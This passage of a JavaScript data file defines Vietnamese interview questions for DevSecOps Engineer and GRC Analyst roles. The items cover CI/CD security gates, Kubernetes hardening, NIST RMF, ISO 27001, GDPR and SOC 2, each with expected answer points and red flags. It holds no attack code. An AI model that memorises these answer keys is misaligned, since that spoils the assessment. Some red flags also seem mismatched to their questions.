    "Trong CV em có ghi kinh nghiệm thiết kế và vận hành pipeline CI/CD an toàn cho tổ chức: Hãy mô tả kiến trúc pipeline đó từ lúc developer commit code đến khi ứng dụng chạy trên Production với đầy đủ các security gates?",
    ["Mô tả chi tiết các công cụ sử dụng (Jenkins/GitHub Actions/GitLab CI, Trivy, Semgrep, ZAP, DefectDojo)", "Cách thiết kế gate policy: Rule nào block merge, rule nào advisory, ngưỡng severity threshold", "Kết quả đạt được: Thời gian pipeline trung bình, tỷ lệ lỗi bảo mật phát hiện sớm tăng bao nhiêu %"],
    ["Thách thức kỹ thuật lớn nhất khi triển khai pipeline đó là gì?", "Cách em thuyết phục đội Dev chấp nhận thêm security steps vào pipeline của họ?"],
    ["CI/CD Architecture", "Security Gates", "Pipeline Optimization", "Developer Adoption"],
    [GRC_SRC.internal],
    ["Khai man kinh nghiệm tích hợp bảo mật vào pipeline CI/CD, không nắm rõ cách cấu hình các công cụ quét"]
  ),
  q("DEVSECOPS-CV-02", "DevSecOps Engineer", "cv_validation", "advanced", "senior_lead",
    "CV có đề cập kinh nghiệm triển khai Kubernetes trên Production: Hãy chia sẻ về cách em cấu hình bảo mật cho cụm Kubernetes (RBAC, Network Policies, Pod Security, Admission Controllers) trong một dự án thực tế?",
    ["Kiến trúc cụm: Multi-tenant hay dedicated clusters, số lượng nodes, namespace strategy", "Cấu hình bảo mật: RBAC granularity, NetworkPolicy default deny, PodSecurity Standards enforcement mode", "Giám sát: Công cụ runtime protection đã triển khai, cách tích hợp với hệ thống giám sát tập trung"],
    ["Lỗi cấu hình Kubernetes nguy hiểm nhất mà em từng phát hiện và khắc phục?", "Cách quản lý secrets trong Kubernetes một cách an toàn?"],
    ["Kubernetes Security", "RBAC Design", "Pod Security Standards", "Runtime Monitoring"],
    [GRC_SRC.internal],
    ["Phóng đại khả năng Infrastructure as Code mà không giải thích được cơ chế Policy as Code thực tế"]
  ),
  q("DEVSECOPS-CV-03", "DevSecOps Engineer", "cv_validation", "intermediate", "junior",
    "Em ghi nhận có kinh nghiệm viết Infrastructure as Code (Terraform/CloudFormation) và áp dụng Policy-as-Code: Hãy mô tả một module Terraform mà em đã tự viết kèm theo cách kiểm tra tuân thủ bảo mật tự động?",
    ["Loại tài nguyên: Module quản lý VPC, S3, RDS hay EKS; các tham số bảo mật mặc định đã được hardcoded (encryption, logging)", "Policy-as-Code: Checkov hoặc tfsec rules đã áp dụng; quy tắc tùy biến nào đã viết thêm", "Quy trình sử dụng: Đội phát triển sử dụng module này như thế nào, cách họ override tham số có kiểm soát"],
    ["Cách em xử lý khi một đội dev cần tạo tài nguyên không nằm trong Golden Modules có sẵn?", "Configuration Drift đã từng xảy ra chưa và cách xử lý?"],
    ["Terraform Security", "Policy-as-Code", "Golden Modules", "Compliance Automation"],
    [GRC_SRC.internal],
    ["Không chứng minh được khả năng đo lường và cải tiến chỉ số bảo mật trong pipeline phát triển"]
  ),
  q("DEVSECOPS-CV-04", "DevSecOps Engineer", "cv_validation", "advanced", "middle",
    "Trong hồ sơ có ghi em từng xử lý sự cố rò rỉ secrets trong code repository: Hãy chia sẻ quy trình phản ứng khẩn cấp mà em đã thực hiện từ lúc nhận cảnh báo đến khi hoàn tất khắc phục?",
    ["Thời gian phản ứng: Bao lâu từ lúc nhận alert đến lúc vô hiệu hóa credential bị lộ", "Phạm vi điều tra: Kiểm tra log sử dụng credential bị lộ, xác định có bị khai thác hay chưa", "Biện pháp phòng ngừa sau sự cố: Pre-commit hooks, training cho dev, chuyển sang dynamic secrets"],
    ["Bài học lớn nhất rút ra từ sự cố đó?", "Cách em đảm bảo sự cố tương tự không tái diễn?"],
    ["Secret Leak Response", "Incident Timeline", "Root Cause Analysis", "Preventive Measures"],
    [GRC_SRC.internal],
    ["Chỉ biết chạy các công cụ quét container mà không hiểu bản chất các lỗ hổng CVE phát hiện được"]
  ),
  q("DEVSECOPS-CV-05", "DevSecOps Engineer", "cv_validation", "intermediate", "middle",
    "CV có nêu em tham gia xây dựng văn hóa DevSecOps cho tổ chức: Hãy chia sẻ cách em đã huấn luyện và thay đổi nhận thức bảo mật cho các lập trình viên trong công ty?",
    ["Phương pháp đào tạo: Workshop thực hành, CTF nội bộ, Lunch & Learn sessions, Secure Coding tournaments", "Đo lường hiệu quả: Số lượng lỗi bảo mật trong code giảm bao nhiêu % sau chương trình đào tạo", "Thách thức: Cách thuyết phục những lập trình viên kỳ cựu thay đổi thói quen code cũ"],
    ["Hoạt động đào tạo nào mang lại hiệu quả cao nhất theo kinh nghiệm của em?", "Cách duy trì động lực học tập bảo mật dài hạn cho đội ngũ?"],
    ["Security Training", "Culture Change", "Developer Engagement", "Metrics-driven Improvement"],
    [GRC_SRC.internal],
    ["Phóng đại kinh nghiệm văn hóa DevSecOps mà không có ví dụ cụ thể về sự thay đổi hành vi của đội ngũ"]
  ),

  // Behavioral (5)
  q("DEVSECOPS-BEHAV-01", "DevSecOps Engineer", "behavioral", "advanced", "middle",
    "DevSecOps Engineer thường xuyên đứng giữa hai áp lực đối lập: Đội Dev muốn release nhanh nhất có thể, còn đội Security muốn kiểm tra kỹ lưỡng nhất có thể. Em làm thế nào để cân bằng hai mục tiêu tưởng chừng mâu thuẫn này?",
    ["Thấu hiểu cả hai phía: Dev chịu áp lực deadline kinh doanh; Security chịu trách nhiệm bảo vệ dữ liệu khách hàng; cả hai đều chính đáng", "Giải pháp kỹ thuật: Tự động hóa tối đa kiểm thử bảo mật để không tốn thời gian thủ công; incremental scanning chỉ quét code mới; risk-based prioritization chỉ chặn lỗi thật sự nguy hiểm", "Giao tiếp và đồng thuận: Xây dựng thỏa thuận về Security SLA được cả PM và Security Lead ký duyệt; minh bạch về những gì bị chặn và lý do cụ thể"],
    ["Khi hai bên không thể thống nhất, em đưa ra quyết định cuối cùng dựa trên nguyên tắc gì?", "Cách biến an ninh thành lợi thế cạnh tranh thay vì gánh nặng?"],
    ["Balancing Speed and Security", "Risk-based Decision Making", "Stakeholder Alignment"],
    [GRC_SRC.internal],
    ["Luôn luôn đứng về phía Dev bỏ qua bảo mật hoặc luôn luôn chặn release gây ức chế"]
  ),
  q("DEVSECOPS-BEHAV-02", "DevSecOps Engineer", "behavioral", "intermediate", "junior",
    "Khi em phát hiện một lập trình viên senior đã tắt tính năng quét bảo mật trong pipeline CI của dự án họ phụ trách vì 'làm chậm quá', em xử lý tình huống này ra sao?",
    ["Tiếp cận riêng tư và tôn trọng: Không công khai chỉ trích; tìm hiểu lý do cụ thể (pipeline chậm thật sự hay chỉ vì bực mình với false positives)", "Giải quyết nguyên nhân gốc: Nếu pipeline chậm thật, cùng họ tối ưu hóa (incremental scan, parallel steps); nếu false positive nhiều, cùng tinh chỉnh ruleset", "Nhắc nhở về chính sách: Giải thích rằng security gates là chính sách bắt buộc của tổ chức; cung cấp giải pháp thay thế tốt hơn thay vì tắt hoàn toàn"],
    ["Nếu họ vẫn kiên quyết từ chối bật lại security scan, em leo thang vấn đề lên ai?", "Cách thiết kế pipeline mà dev không thể tự ý tắt security steps?"],
    ["Policy Enforcement", "Constructive Confrontation", "Root Cause Resolution"],
    [GRC_SRC.internal],
    ["Nhắm mắt bỏ qua hoặc ngược lại gửi email CC toàn công ty tố cáo đồng nghiệp"]
  ),
  q("DEVSECOPS-BEHAV-03", "DevSecOps Engineer", "behavioral", "advanced", "senior_lead",
    "Trong một dự án lớn, công cụ SCA phát hiện một thư viện mã nguồn mở cốt lõi (mà toàn bộ hệ thống phụ thuộc) có giấy phép GPL-3.0, trong khi sản phẩm thương mại của công ty không tương thích với GPL. Việc thay thế thư viện này sẽ mất 3 tháng công sức. Em tư vấn cho Ban Giám đốc ra sao?",
    ["Trình bày rủi ro pháp lý rõ ràng: GPL-3.0 yêu cầu bất kỳ phần mềm phái sinh nào cũng phải mở mã nguồn theo cùng giấy phép; vi phạm có thể dẫn đến kiện tụng bản quyền phần mềm và buộc phải mở mã nguồn toàn bộ sản phẩm thương mại", "Phân tích kỹ thuật: Đánh giá mức độ tích hợp của thư viện đó (linking tĩnh hay động, API boundary rõ ràng hay không)", "Đề xuất lộ trình: Ngắn hạn - tham vấn luật sư sở hữu trí tuệ; Trung hạn - xây dựng abstraction layer để cô lập phụ thuộc; Dài hạn - thay thế bằng thư viện có giấy phép tương thích (MIT, Apache 2.0)"],
    ["Sự khác biệt giữa giấy phép Copyleft (GPL) và Permissive (MIT, Apache 2.0)?", "Tại sao việc quét giấy phép phần mềm (License Compliance) cần được thực hiện sớm trong SDLC?"],
    ["License Compliance", "GPL Risk", "Open Source Governance", "Legal Risk Communication"],
    [GRC_SRC.internal],
    ["Bỏ qua cảnh báo giấy phép vì cho rằng 'chả ai kiểm tra đâu'"]
  ),
  q("DEVSECOPS-BEHAV-04", "DevSecOps Engineer", "behavioral", "intermediate", "middle",
    "Công nghệ DevOps và bảo mật liên tục ra mắt các công cụ mới mỗi tháng (eBPF security, AI-powered code review, Software Supply Chain). Em duy trì việc cập nhật kiến thức chuyên sâu và đánh giá công nghệ mới như thế nào?",
    ["Xây dựng thói quen học tập có hệ thống: Theo dõi các nguồn uy tín (tl;dr sec newsletter, CloudSecList, DevSecOps Days talks), dành 2-3 giờ/tuần thực hành trên lab cá nhân", "Đánh giá công nghệ mới một cách thận trọng: Không chạy theo trend mù quáng; kiểm tra community adoption, tài liệu, tính ổn định và khả năng tích hợp với stack hiện tại trước khi đề xuất", "Chia sẻ lại: Viết blog kỹ thuật nội bộ hoặc trình bày tại buổi Tech Talk của công ty"],
    ["Một công nghệ DevSecOps mới nhất khiến em hào hứng nhất gần đây là gì?", "Cách cân bằng giữa việc duy trì hệ thống hiện tại và khám phá công nghệ mới?"],
    ["Continuous Learning", "Technology Evaluation", "Knowledge Sharing", "Balanced Innovation"],
    [GRC_SRC.internal],
    ["Ngại học hỏi công nghệ mới, áp dụng máy móc các giải pháp bảo mật cũ kỹ vào môi trường cloud-native hiện đại"]
  ),
  q("DEVSECOPS-BEHAV-05", "DevSecOps Engineer", "behavioral", "advanced", "middle",
    "Khi một sự cố bảo mật trên Production xảy ra do một lỗ hổng mà pipeline CI/CD của em phụ trách đã không phát hiện được (ví dụ: một Business Logic Flaw mà SAST/DAST không bắt được), em đối diện với trách nhiệm của mình như thế nào?",
    ["Nhận trách nhiệm chuyên môn: Không đổ lỗi cho công cụ hay cho dev; phân tích thẳng thắn tại sao pipeline không phát hiện được (hạn chế cố hữu của SAST đối với business logic)", "Hành động khắc phục: Bổ sung thêm lớp kiểm tra phù hợp (manual security review checklist cho các tính năng tài chính nhạy cảm, integration security tests)", "Cải tiến liên tục: Cập nhật pipeline và quy trình review; chia sẻ bài học kinh nghiệm (blameless post-mortem) với toàn đội"],
    ["Tại sao không có pipeline nào có thể phát hiện 100% lỗ hổng và làm thế nào để truyền thông điều này một cách trung thực?", "Cách xây dựng chiến lược 'Defense in Depth' cho DevSecOps?"],
    ["Accountability", "Pipeline Limitations", "Continuous Improvement", "Blameless Post-Mortem"],
    [GRC_SRC.internal],
    ["Đổ lỗi cho SAST/DAST hoặc cho rằng business logic flaw không thuộc trách nhiệm DevSecOps"]
  )
];

console.log("DevSecOps questions defined:", devSecOpsQuestions.length);

// ==========================================
// 2. GRC ANALYST
// ==========================================
const grcAnalystQuestions = [
  // Foundation (6)
  q("GRC-FOUND-01", "GRC Analyst", "foundation", "intermediate", "junior",
    "Ba trụ cột của GRC (Governance, Risk, Compliance): Cách chúng phối hợp tạo nên hệ thống quản trị an ninh thông tin toàn diện cho doanh nghiệp?",
    ["Governance: Thiết lập chính sách, quy trình, cơ cấu tổ chức và trách nhiệm giải trình (Accountability) cho an toàn thông tin", "Risk Management: Nhận diện, đánh giá và xử lý rủi ro an ninh bằng phương pháp định lượng hoặc định tính", "Compliance: Đảm bảo tuân thủ các quy định pháp luật, tiêu chuẩn ngành và chính sách nội bộ; theo dõi và chứng minh bằng bằng chứng kiểm toán"],
    ["GRC khác gì so với công việc kỹ thuật thuần túy của Security Engineer?", "Tại sao một công ty có nhiều kỹ sư bảo mật giỏi nhưng thiếu GRC vẫn có thể bị phạt hàng triệu USD?"],
    ["GRC Framework", "Governance", "Risk Management", "Compliance", "Accountability"],
    [GRC_SRC.nist_csf, GRC_SRC.internal],
    ["Đánh đồng Compliance với Security và cho rằng đạt chứng chỉ ISO 27001 là đã an toàn tuyệt đối"]
  ),
  q("GRC-FOUND-02", "GRC Analyst", "foundation", "advanced", "middle",
    "Khung Quản lý Rủi ro NIST RMF (Risk Management Framework - SP 800-37): Bảy bước (Prepare, Categorize, Select, Implement, Assess, Authorize, Monitor) và cách áp dụng cho một hệ thống thông tin cụ thể?",
    ["Categorize: Phân loại hệ thống theo mức độ tác động (Impact Level: Low, Moderate, High) dựa trên CIA triad", "Select & Implement: Chọn bộ kiểm soát an ninh phù hợp từ NIST SP 800-53 và triển khai; Assess: Đánh giá hiệu quả các kiểm soát đã triển khai", "Authorize: Người có thẩm quyền (AO - Authorizing Official) ký phê duyệt chấp nhận rủi ro còn lại; Monitor: Giám sát liên tục hiệu quả các kiểm soát sau khi hệ thống đi vào vận hành"],
    ["Ai là Authorizing Official và tại sao họ phải chịu trách nhiệm pháp lý về quyết định chấp nhận rủi ro?", "NIST RMF khác gì so với ISO 27005 Risk Management?"],
    ["NIST RMF", "SP 800-37", "SP 800-53", "Risk Categorization", "Authorization to Operate"],
    [GRC_SRC.nist_rmf, GRC_SRC.nist_csf],
    ["Bỏ qua bước 'Prepare' và 'Monitor' dẫn đến quy trình quản lý rủi ro không liên tục"]
  ),
  q("GRC-FOUND-03", "GRC Analyst", "foundation", "advanced", "middle",
    "Hệ thống Quản lý An toàn Thông tin ISO 27001:2022 (ISMS): Cấu trúc của các điều khoản bắt buộc (Clauses 4-10) và Phụ lục A (93 kiểm soát trong 4 chủ đề) thay đổi gì so với phiên bản 2013?",
    ["Clauses 4-10: Bối cảnh tổ chức (4), Lãnh đạo (5), Hoạch định (6), Hỗ trợ (7), Vận hành (8), Đánh giá hiệu quả (9), Cải tiến (10) theo vòng lặp PDCA", "ISO 27001:2022 Annex A: Giảm từ 114 kiểm soát (14 lĩnh vực) xuống 93 kiểm soát (4 chủ đề: Organizational, People, Physical, Technological); bổ sung 11 kiểm soát mới (Cloud security, Threat intelligence, Data masking, ICT readiness for business continuity)", "Đánh giá Tuyên bố Khả dụng (Statement of Applicability - SoA): Tài liệu bắt buộc liệt kê từng kiểm soát Annex A, lý do áp dụng hoặc loại trừ, và phương thức triển khai"],
    ["Sự khác biệt giữa chứng nhận (Certification) và tuân thủ (Conformity) ISO 27001?", "Quy trình đánh giá nội bộ (Internal Audit) và đánh giá bên ngoài (Certification Audit Stage 1 & 2)?"],
    ["ISO 27001:2022", "ISMS", "Statement of Applicability", "Annex A Controls", "PDCA Cycle"],
    [GRC_SRC.iso27001, GRC_SRC.internal],
    ["Chỉ tập trung vào chứng chỉ mà không xây dựng hệ thống quản lý thực sự vận hành"]
  ),
  q("GRC-FOUND-04", "GRC Analyst", "foundation", "intermediate", "junior",
    "Đánh giá Rủi ro An ninh Thông tin (Information Security Risk Assessment): Phương pháp định tính (Qualitative: Heat Map / Risk Matrix) vs Định lượng (Quantitative: ALE = SLE × ARO theo FAIR Model)?",
    ["Qualitative: Sử dụng ma trận rủi ro (Likelihood × Impact) xếp hạng High/Medium/Low; dễ hiểu, nhanh nhưng chủ quan", "Quantitative (FAIR - Factor Analysis of Information Risk): Tính toán Tổn thất Dự kiến Hàng năm (ALE) = Mức tổn thất đơn lẻ (SLE) × Tần suất xảy ra hàng năm (ARO); cho ra con số tài chính cụ thể giúp so sánh ROI đầu tư bảo mật", "Thực tế: Hầu hết tổ chức kết hợp cả hai; dùng Qualitative để sàng lọc ban đầu, sau đó Quantitative phân tích sâu cho các rủi ro trọng yếu"],
    ["Tại sao CISO luôn cần số liệu tài chính cụ thể thay vì chỉ nói 'rủi ro cao'?", "Mô hình FAIR phân tích các yếu tố đầu vào (Threat Event Frequency, Vulnerability, Loss Magnitude) ra sao?"],
    ["Risk Assessment", "Qualitative vs Quantitative", "FAIR Model", "ALE SLE ARO", "Risk Matrix"],
    [GRC_SRC.nist_rmf, GRC_SRC.internal],
    ["Chỉ dùng ma trận rủi ro Red/Yellow/Green đơn giản cho mọi quyết định đầu tư triệu USD"]
  ),
  q("GRC-FOUND-05", "GRC Analyst", "foundation", "advanced", "senior_lead",
    "Các quy định bảo vệ dữ liệu cá nhân: So sánh GDPR (EU), Nghị định 13/2023/NĐ-CP (Việt Nam) và PDPA (Singapore/Thái Lan) về quyền của chủ thể dữ liệu, nghĩa vụ thông báo vi phạm và mức xử phạt?",
    ["GDPR: Quyền truy cập, xóa, di chuyển dữ liệu; thông báo vi phạm trong 72 giờ cho cơ quan quản lý; phạt tối đa 4% doanh thu toàn cầu hoặc 20 triệu EUR", "Nghị định 13/2023/NĐ-CP (Việt Nam): Yêu cầu đồng ý rõ ràng của chủ thể dữ liệu; nghĩa vụ thông báo cho Bộ Công an trong vòng 72 giờ khi phát hiện vi phạm; áp dụng cho cả tổ chức nước ngoài xử lý dữ liệu người Việt Nam", "PDPA Singapore: Phạt tối đa 10% doanh thu hàng năm hoặc 1 triệu SGD; yêu cầu lưu giữ dữ liệu có mục đích rõ ràng và bổ nhiệm DPO (Data Protection Officer)"],
    ["Tại sao một công ty Việt Nam có người dùng châu Âu vẫn phải tuân thủ GDPR?", "Cách triển khai quyền 'Quyền yêu cầu xóa dữ liệu' (Right to Erasure) trên hệ thống phần mềm phức tạp?"],
    ["GDPR", "Nghị định 13", "PDPA", "Data Subject Rights", "Breach Notification", "Cross-Border Compliance"],
    [GRC_SRC.gdpr, GRC_SRC.internal],
    ["Cho rằng quy định bảo vệ dữ liệu cá nhân chỉ áp dụng cho các công ty châu Âu"]
  ),
  q("GRC-FOUND-06", "GRC Analyst", "foundation", "intermediate", "junior",
    "Kiểm soát Nội bộ và Phân tách Nhiệm vụ (Segregation of Duties - SoD): Tại sao một nhân viên không được phép vừa phê duyệt giao dịch vừa thực hiện giao dịch và vừa kiểm tra giao dịch đó?",
    ["SoD chia ba chức năng: Ủy quyền (Authorization), Thực hiện (Custody/Execution), và Ghi nhận (Recording); không ai nắm giữ cả ba để ngăn chặn gian lận", "Ví dụ IT: Lập trình viên không nên có quyền deploy code lên Production mà không qua bước review và phê duyệt của người khác; DBA không nên tự cấp quyền admin cho chính mình", "Kiểm soát bù trừ: Trong tổ chức nhỏ thiếu nhân sự không thể tách hoàn toàn, áp dụng Detective Controls (ghi log mọi hành vi, rà soát định kỳ, giám sát bất thường)"],
    ["Xung đột SoD phổ biến nhất trong quyền hạn hệ thống ERP (SAP) là gì?", "Tại sao SoD là yêu cầu bắt buộc trong SOX Compliance (Đạo luật Sarbanes-Oxley)?"],
    ["Segregation of Duties", "Internal Controls", "Fraud Prevention", "Compensating Controls", "SOX Compliance"],
    [GRC_SRC.iso27001, GRC_SRC.internal],
    ["Cho phép một người vừa tạo tài khoản người dùng vừa phê duyệt quyền truy cập và vừa kiểm tra nhật ký"]
  ),

  // Practical Skills (8)
  q("GRC-PRAC-01", "GRC Analyst", "practical_skills", "advanced", "middle",
    "Xây dựng Sổ đăng ký Rủi ro (Risk Register) và Kế hoạch Xử lý Rủi ro (Risk Treatment Plan) cho tổ chức: Cách thiết kế, duy trì và trình bày Risk Register cho CISO và Hội đồng Quản trị?",
    ["Risk Register: Mỗi rủi ro ghi rõ ID, mô tả, tài sản bị ảnh hưởng, chủ sở hữu rủi ro (Risk Owner), đánh giá Likelihood × Impact trước và sau kiểm soát (Inherent vs Residual Risk), chiến lược xử lý (Mitigate, Accept, Transfer, Avoid)", "Risk Treatment Plan: Đối với rủi ro quyết định Mitigate, liệt kê các biện pháp kiểm soát cụ thể, người phụ trách triển khai, ngân sách, thời hạn hoàn thành và chỉ số đo lường hiệu quả (KRI - Key Risk Indicator)", "Trình bày cho lãnh đạo: Sử dụng Heat Map trực quan; tập trung vào Top 10 rủi ro cao nhất; trình bày bằng ngôn ngữ tác động kinh doanh thay vì thuật ngữ kỹ thuật"],
    ["Làm thế nào để thuyết phục Risk Owner (thường là Giám đốc bộ phận kinh doanh) nhận trách nhiệm quản lý rủi ro IT?", "Tần suất rà soát Risk Register phù hợp?"],
    ["Risk Register", "Risk Treatment Plan", "Heat Map", "Key Risk Indicators", "Residual Risk"],
    [GRC_SRC.nist_rmf, GRC_SRC.internal],
    ["Tạo một Risk Register hình thức chỉ để phục vụ đợt kiểm toán rồi bỏ xó không cập nhật"]
  ),
  q("GRC-PRAC-02", "GRC Analyst", "practical_skills", "advanced", "middle",
    "Soạn thảo Bộ Chính sách An toàn Thông tin (Information Security Policy Framework): Cấu trúc phân cấp từ Policy -> Standard -> Procedure -> Guideline và cách đảm bảo tính khả dụng cho nhân viên?",
    ["Policy: Tuyên bố ý chí cấp cao (vd: 'Mọi dữ liệu nhạy cảm phải được mã hóa'); được Tổng Giám đốc phê duyệt", "Standard: Quy định cụ thể (vd: 'Sử dụng AES-256 GCM cho mã hóa dữ liệu lưu trữ; TLS 1.3 cho truyền tải')", "Procedure: Hướng dẫn từng bước cách thực hiện (vd: 'Cách cấu hình mã hóa S3 bucket bằng KMS CMK')", "Guideline: Khuyến nghị không bắt buộc, best practices tham khảo"],
    ["Tại sao Policy phải được C-Level phê duyệt nhưng Procedure thì do đội kỹ thuật tự quản lý?", "Cách truyền thông chính sách an ninh cho 5,000 nhân viên một cách hiệu quả?"],
    ["Policy Framework", "Standards vs Procedures", "Policy Hierarchy", "Employee Communication"],
    [GRC_SRC.iso27001, GRC_SRC.internal],
    ["Viết chính sách dài 200 trang bằng ngôn ngữ pháp lý rối rắm mà không ai đọc và hiểu"]
  ),
  q("GRC-PRAC-03", "GRC Analyst", "practical_skills", "advanced", "senior_lead",
    "Thiết kế và Triển khai Chương trình Kiểm toán Nội bộ An ninh Thông tin (Internal Audit Program): Lập kế hoạch kiểm toán hàng năm dựa trên rủi ro (Risk-based Audit Plan), thực hiện kiểm toán và viết báo cáo phát hiện?",
    ["Risk-based Audit Plan: Ưu tiên kiểm toán các lĩnh vực có rủi ro cao nhất (vd: quản lý truy cập đặc quyền, backup & recovery, quản lý thay đổi) thay vì kiểm tra mọi thứ đều đều", "Audit Fieldwork: Thu thập bằng chứng (Evidence sampling), phỏng vấn nhân sự, kiểm tra cấu hình hệ thống, đối chiếu tài liệu với thực tế vận hành", "Audit Report: Mỗi phát hiện ghi rõ Condition (tình trạng thực tế), Criteria (tiêu chuẩn yêu cầu), Cause (nguyên nhân gốc rễ), Consequence (hậu quả tiềm ẩn) và Recommendation (khuyến nghị khắc phục kèm thời hạn)"],
    ["Cách xử lý khi bộ phận bị kiểm toán không hợp tác hoặc cung cấp bằng chứng sai lệch?", "Khác biệt giữa Non-conformity (không phù hợp) và Observation (quan sát/khuyến nghị)?"],
    ["Internal Audit Program", "Risk-based Audit", "Audit Evidence", "Finding Report", "5C Format"],
    [GRC_SRC.iso27001, GRC_SRC.internal],
    ["Kiểm toán bằng cách gửi bảng câu hỏi tự đánh giá và tin hoàn toàn vào câu trả lời mà không kiểm chứng"]
  ),
  q("GRC-PRAC-04", "GRC Analyst", "practical_skills", "advanced", "middle",
    "Quản lý Đánh giá Rủi ro Bên thứ ba (Third-Party Risk Management - TPRM): Cách đánh giá an ninh của nhà cung cấp dịch vụ đám mây, đối tác phần mềm và bên gia công phần mềm (Vendor Security Assessment)?",
    ["Phân loại vendor theo mức độ rủi ro: Critical (truy cập dữ liệu nhạy cảm), High (tích hợp API hệ thống cốt lõi), Medium, Low", "Đánh giá: Gửi bộ câu hỏi chuẩn (SIG Questionnaire hoặc CAIQ), yêu cầu cung cấp chứng chỉ SOC 2 Type II / ISO 27001 / Penetration Test Report", "Theo dõi liên tục: Không chỉ đánh giá một lần khi ký hợp đồng; giám sát định kỳ bằng các dịch vụ Security Rating (BitSight, SecurityScorecard) và thỏa thuận hợp đồng SLA an ninh bắt buộc"],
    ["Tại sao sự cố an ninh tại nhà cung cấp bên thứ ba có thể phá sản doanh nghiệp của bạn (SolarWinds, Kaseya)?", "Cách xử lý khi một vendor Critical từ chối cung cấp báo cáo SOC 2?"],
    ["Third-Party Risk", "Vendor Security Assessment", "SIG Questionnaire", "SOC 2 Review", "SecurityScorecard"],
    [GRC_SRC.nist_csf, GRC_SRC.internal],
    ["Ký hợp đồng với vendor xử lý dữ liệu nhạy cảm mà không yêu cầu bất kỳ chứng nhận an ninh nào"]
  ),
  q("GRC-PRAC-05", "GRC Analyst", "practical_skills", "intermediate", "junior",
    "Quản lý Chương trình Nâng cao Nhận thức An ninh Thông tin (Security Awareness Program): Cách thiết kế và đo lường hiệu quả các chiến dịch đào tạo phòng chống lừa đảo Phishing cho toàn bộ nhân viên?",
    ["Thiết kế chương trình đào tạo: Kết hợp đa phương thức - E-learning ngắn (video 5-10 phút), Quiz tương tác, Poster/Infographic dán trong văn phòng, và Simulated Phishing Campaigns", "Mô phỏng Phishing: Gửi email giả mạo định kỳ tới nhân viên; theo dõi tỷ lệ click link, tỷ lệ nhập mật khẩu, và tỷ lệ báo cáo email nghi ngờ lên đội IT", "Đo lường hiệu quả: Theo dõi xu hướng Phishing Click Rate giảm dần sau mỗi đợt; tỷ lệ báo cáo nghi ngờ tăng lên; liên kết kết quả đào tạo với dữ liệu sự cố thực tế"],
    ["Cách xử lý khi một nhân viên liên tục bị 'dính' email giả mạo qua nhiều lần kiểm tra?", "Tại sao đào tạo Awareness không nên mang tính trừng phạt mà phải mang tính khuyến khích?"],
    ["Security Awareness", "Phishing Simulation", "Click Rate Metrics", "Behavior Change", "Gamification"],
    [GRC_SRC.internal],
    ["Chỉ tổ chức một buổi đào tạo bắt buộc mỗi năm bằng slide PowerPoint khô khan"]
  ),
  q("GRC-PRAC-06", "GRC Analyst", "practical_skills", "advanced", "middle",
    "Xây dựng Kế hoạch Liên tục Kinh doanh và Phục hồi sau Thảm họa (BCP/DRP - Business Continuity Plan / Disaster Recovery Plan): Các bước phân tích tác động kinh doanh (BIA - Business Impact Analysis)?",
    ["BIA: Xác định các quy trình kinh doanh trọng yếu nhất; đánh giá tác động tài chính, pháp lý và uy tín nếu mỗi quy trình bị gián đoạn theo thời gian (1 giờ, 4 giờ, 24 giờ, 7 ngày)", "Thiết lập chỉ số: RPO (Recovery Point Objective - mức mất dữ liệu tối đa chấp nhận được) và RTO (Recovery Time Objective - thời gian phục hồi dịch vụ tối đa chấp nhận được) cho từng hệ thống", "DRP: Kế hoạch kỹ thuật chi tiết để khôi phục các hệ thống CNTT quan trọng; BCP: Kế hoạch tổng thể rộng hơn bao gồm cả nhân sự, vị trí làm việc dự phòng, và liên lạc khẩn cấp"],
    ["Tại sao kế hoạch BCP/DRP bắt buộc phải được diễn tập thực tế (Tabletop Exercise / Full-scale Drill) ít nhất mỗi năm một lần?", "Khác biệt giữa RPO và RTO khi đưa ra quyết định đầu tư hệ thống sao lưu?"],
    ["BCP DRP", "Business Impact Analysis", "RPO RTO", "Tabletop Exercise", "Crisis Management"],
    [GRC_SRC.iso27001, GRC_SRC.internal],
    ["Viết kế hoạch BCP/DRP 100 trang nhưng chưa bao giờ thử nghiệm trong thực tế"]
  ),
  q("GRC-PRAC-07", "GRC Analyst", "practical_skills", "advanced", "senior_lead",
    "Chuẩn bị và hỗ trợ doanh nghiệp đạt chứng nhận SOC 2 Type II (Service Organization Control): Phân biệt 5 Trust Services Criteria (Security, Availability, Processing Integrity, Confidentiality, Privacy) và quy trình chuẩn bị bằng chứng?",
    ["SOC 2 Type I: Đánh giá thiết kế kiểm soát tại một thời điểm; Type II: Đánh giá hiệu quả vận hành liên tục trong khoảng thời gian 6-12 tháng (bền vững hơn, có giá trị hơn nhiều)", "Trust Services Criteria: Security là tiêu chí bắt buộc; các tiêu chí khác (Availability, Confidentiality...) tùy chọn theo dịch vụ cung cấp", "Chuẩn bị bằng chứng: Thu thập screenshots cấu hình, log truy cập, biên bản rà soát, bản ghi đào tạo nhân viên, kết quả kiểm thử xâm nhập, và báo cáo quét lỗ hổng theo từng Control Objective"],
    ["Tại sao khách hàng doanh nghiệp (B2B SaaS) ngày càng yêu cầu bắt buộc nhà cung cấp phải có SOC 2 Type II?", "Cách quản lý lượng bằng chứng khổng lồ bằng các nền tảng GRC tự động (Vanta, Drata, Thoropass)?"],
    ["SOC 2 Type II", "Trust Services Criteria", "Evidence Collection", "Audit Readiness", "GRC Automation"],
    [GRC_SRC.internal],
    ["Thu thập bằng chứng vào phút chót trước kỳ kiểm toán thay vì duy trì liên tục suốt 12 tháng"]
  ),
  q("GRC-PRAC-08", "GRC Analyst", "practical_skills", "advanced", "middle",
    "Đánh giá tác động bảo vệ dữ liệu (DPIA - Data Protection Impact Assessment) theo GDPR Điều 35: Quy trình thực hiện và thời điểm bắt buộc?",
    ["Bắt buộc khi: Xử lý dữ liệu nhạy cảm quy mô lớn, giám sát hành vi cá nhân, sử dụng công nghệ mới (AI profiling, biometric identification), hoặc kết hợp các loại dữ liệu tạo hồ sơ cá nhân", "Quy trình: Mô tả hoạt động xử lý dữ liệu -> Đánh giá tính cần thiết và cân xứng -> Nhận diện rủi ro đối với quyền tự do của chủ thể dữ liệu -> Đề xuất biện pháp giảm thiểu rủi ro", "Kết quả: Báo cáo DPIA phải được DPO (Data Protection Officer) xem xét; nếu rủi ro còn lại vẫn cao sau khi áp dụng biện pháp, phải tham vấn cơ quan bảo vệ dữ liệu trước khi xử lý"],
    ["Ai chịu trách nhiệm phê duyệt DPIA: DPO hay Data Controller?", "Cách thuyết phục đội sản phẩm thực hiện DPIA trước khi phát triển tính năng AI mới?"],
